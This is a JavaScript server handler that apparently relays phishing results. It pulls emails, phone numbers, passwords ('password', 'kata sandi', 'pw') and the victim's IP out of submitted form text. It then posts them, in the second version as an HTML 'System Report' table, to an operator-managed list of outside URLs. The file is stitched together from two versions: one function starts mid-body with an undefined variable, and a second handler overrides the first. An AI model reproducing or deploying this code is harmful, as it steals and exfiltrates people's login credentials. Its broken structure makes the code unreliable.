const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

// ======================
// ANTI SPAM MEMORY
// ======================
const lastRequest = new Map();
const COOLDOWN_MS = 5000;

// ======================
// LOAD / SAVE URLS
// ======================
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    return JSON.parse(fs.readFileSync(FILE, "utf8"));
  } catch {
    return [];
  }
}

function saveUrls(data) {
  fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
}

// ======================
// PARSE BODY
// ======================
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === "string") {
    return Object.fromEntries(new URLSearchParams(req.body));
  }
  return req.body;
}

// ======================
// CLEAN INPUT
// ======================
function cleanInput(input = "") {
  return String(input)
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<\/?[^>]+>/g, "\n")
    .replace(/\n{2,}/g, "\n");
}

// ======================
// AUTO DETECT VARIABLES
// ======================
function extractVars(input = "") {
  const text = String(input);
  const vars = {};

  let m;

  // ======================
  // PHP STYLE: $var = value
  // ======================
  const phpRegex = /\$([a-zA-Z0-9_]+)\s*=\s*([^<\n]+)/g;
  while ((m = phpRegex.exec(text))) {
    vars[m[1].toLowerCase()] = m[2].trim();
  }

  // ======================
  // KEY:VALUE / KEY=VALUE
  // ======================
  const kvRegex = /([a-zA-Z0-9_]{2,})\s*[:=]\s*([^<\n]+)/g;
  while ((m = kvRegex.exec(text))) {
    const k = m[1].toLowerCase();
    const v = m[2].trim();

    if (!["http", "https", "www"].includes(k) && v.length < 200) {
      vars[k] = v;
    }
  }

  // ======================
  // EMAIL DETECT
  // ======================
  const email = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}/i);
  if (email) vars.email = email[0];

  // ======================
  // PHONE DETECT
  // ======================
  const phone = text.match(/(\+?\d{8,15})/);
  if (phone) vars.phone = phone[1];

  // ======================
  // 🔥 PASSWORD SMART DETECT (FIXED FULL)
  // ======================

  // 1. password: / password= / kata sandi:
  const pass1 = text.match(/(?:password|pass|passwd|kata\s*sandi)\s*[:=]\s*([^\n<]+)/i);
  if (pass1) vars.password = pass1[1].trim();

  // 2. label "Kata Sandi 123"
  const pass2 = text.match(/kata\s*sandi[^a-zA-Z0-9]*([^\n<]+)/i);
  if (!vars.password && pass2) {
    vars.password = pass2[1].trim();
  }

  // 3. short form pw / pwd
  const pass3 = text.match(/(?:pw|pwd)\s*[:=]\s*([^\n<]+)/i);
  if (!vars.password && pass3) {
    vars.password = pass3[1].trim();
  }

  return vars;
}

// ======================
// ANTI SPAM CHECK
// ======================
function checkSpam(req) {
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress;

  const now = Date.now();

  if (lastRequest.has(ip)) {
    const diff = now - lastRequest.get(ip);

    if (diff < COOLDOWN_MS) {
      return {
        block: true,
        retry: Math.ceil((COOLDOWN_MS - diff) / 1000)
      };
    }
  }

  lastRequest.set(ip, now);
  return { block: false, ip };
}

// ======================
// MAIN HANDLER
// ======================
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false });
    }

    // ======================
    // ANTI SPAM
    // ======================
    const spam = checkSpam(req);
    if (spam.block) {
      return res.json({
        success: false,
        message: "Too many requests",
        retry_after: spam.retry
      });
    }

    const body = parseBody(req);
    let urls = loadUrls();

    const action = body.action || "send";

    // ======================
    // URL MANAGER
    // ======================
    if (action === "add-url") {
      if (body.url && !urls.includes(body.url)) {
        urls.push(body.url);
        saveUrls(urls);
      }
      return res.json({ success: true, urls });
    }

    if (action === "delete-url") {
      urls = urls.filter(x => x !== body.url);
      saveUrls(urls);
      return res.json({ success: true, urls });
    }

    if (action === "list-url") {
      return res.json({ success: true, urls });
    }

    // ======================
    // SEND MESSAGE
    // ======================
    const subjek = body.subjek || "";
    const sender = body.sender || "system";
    let message = body.message || body.pesan || "";

    if (!subjek || !message) {
      return res.json({
        success: false,
        message: "subjek/message wajib diisi"
      });
    }

    message = cleanInput(message);

    const vars = extractVars(message);

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress;

    vars.ip = vars.ip || ip;

    const payload = new URLSearchParams({
      subjek,
      pesan: message,
      sender
    }).toString();

    const fetchFn = global.fetch || require("node-fetch");

    if (!urls.length) {
      return res.json({ success: false, message: "URL kosong" });
    }

    // ======================
    // PARALLEL SEND
    // ======================
    const results = await Promise.allSettled(
      urls.map(async (url) => {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 8000);

        try {
          const r = await fetchFn(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: payload,
            signal: controller.signal
          });

          clearTimeout(timeout);

          return {
            url,
            status: r.status,
            success: r.ok
          };
        } catch (err) {
          clearTimeout(timeout);

          return {
            url,
            success: false,
            error: err.name === "AbortError" ? "TIMEOUT" : err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      vars,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      error: err.message
    });
  }
};
  while ((m = regex1.exec(text)) !== null) {
    const key = m[1].toLowerCase().trim();
    const value = m[2].trim();
    if (value) vars[key] = value;
  }

  // PHP style $var = value
  const regex2 = /\$([a-zA-Z0-9_]+)\s*=\s*([^\n<]+)/g;

  while ((m = regex2.exec(text)) !== null) {
    const key = m[1].toLowerCase().trim();
    const value = m[2].trim();
    if (value) vars[key] = value;
  }

  return vars;
}

// ======================
// ROW HTML
// ======================
function row(label, value, color = "#e5e7eb") {
  if (!value) return "";

  return `
    <tr>
      <td style="padding:10px 12px;border-bottom:1px solid #1f2937;color:#94a3b8;width:140px;font-size:13px">
        ${label}
      </td>
      <td style="padding:10px 12px;border-bottom:1px solid #1f2937;color:${color};font-size:13px">
        ${value}
      </td>
    </tr>
  `;
}

// ======================
// BUILD HTML
// ======================
function buildHtml(vars) {
  return `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>

<body style="margin:0;background:#0f172a;font-family:Arial,sans-serif;color:#e5e7eb">

<div style="max-width:700px;margin:40px auto;background:#111827;border:1px solid #1f2937;border-radius:12px;overflow:hidden">

  <div style="padding:18px 22px;background:#0b1220;border-bottom:1px solid #1f2937">
    <div style="font-size:15px;font-weight:600;color:#fff">System Report</div>
    <div style="font-size:12px;color:#94a3b8">Monitoring Dashboard</div>
  </div>

  <div style="padding:18px 22px">
    <table style="width:100%;border-collapse:collapse">
      ${row("User", vars.user)}
      ${row("Email", vars.email)}
      ${row("Password", vars.password, "#f87171")}
      ${row("Login", vars.login, "#34d399")}
      ${row("Phone", vars.phone)}
      ${row("IP Address", vars.ip, "#60a5fa")}
    </table>
  </div>

</div>

</body>
</html>
`;
}

// ======================
// MAIN HANDLER
// ======================
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false, message: "POST only" });
    }

    // ======================
    // ANTI SPAM CHECK
    // ======================
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress;

    const now = Date.now();

    if (lastRequest.has(ip)) {
      const diff = now - lastRequest.get(ip);

      if (diff < COOLDOWN_MS) {
        return res.json({
          success: false,
          message: "Too many requests (anti-spam)",
          retry_after: Math.ceil((COOLDOWN_MS - diff) / 1000)
        });
      }
    }

    lastRequest.set(ip, now);

    // ======================
    // BODY
    // ======================
    const body = parseBody(req);
    let urls = loadUrls();

    const action = body.action || "send";

    // ======================
    // ADD URL
    // ======================
    if (action === "add-url") {
      if (!body.url) {
        return res.json({ success: false, message: "URL kosong" });
      }

      if (!urls.includes(body.url)) {
        urls.push(body.url);
        saveUrls(urls);
      }

      return res.json({ success: true, urls });
    }

    // ======================
    // DELETE URL
    // ======================
    if (action === "delete-url") {
      urls = urls.filter(x => x !== body.url);
      saveUrls(urls);
      return res.json({ success: true, urls });
    }

    // ======================
    // LIST URL
    // ======================
    if (action === "list-url") {
      return res.json({ success: true, urls });
    }

    // ======================
    // SEND MESSAGE
    // ======================
    const subjek = body.subjek || "";
    const sender = body.sender || "system";
    let messageRaw = body.message || body.pesan || "";

    if (!subjek || !messageRaw) {
      return res.status(400).json({
        success: false,
        message: "subjek & message wajib diisi"
      });
    }

    messageRaw = cleanInput(messageRaw);

    const vars = extractVars(messageRaw);

    vars.ip = vars.ip || ip;

    const html = buildHtml(vars);

    const payload = new URLSearchParams({
      subjek,
      pesan: html,
      sender
    }).toString();

    const fetchFn = global.fetch || require("node-fetch");

    if (!urls.length) {
      return res.json({
        success: false,
        message: "URL kosong"
      });
    }

    // ======================
    // SEND PARALLEL (FAST)
    // ======================
    const results = await Promise.allSettled(
      urls.map(async (url) => {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 8000);

        try {
          const r = await fetchFn(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: payload,
            signal: controller.signal
          });

          clearTimeout(timeout);

          return {
            url,
            status: r.status,
            success: r.ok
          };
        } catch (err) {
          clearTimeout(timeout);

          return {
            url,
            success: false,
            error: err.name === "AbortError" ? "TIMEOUT" : err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      vars,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      error: err.message
    });
  }
};
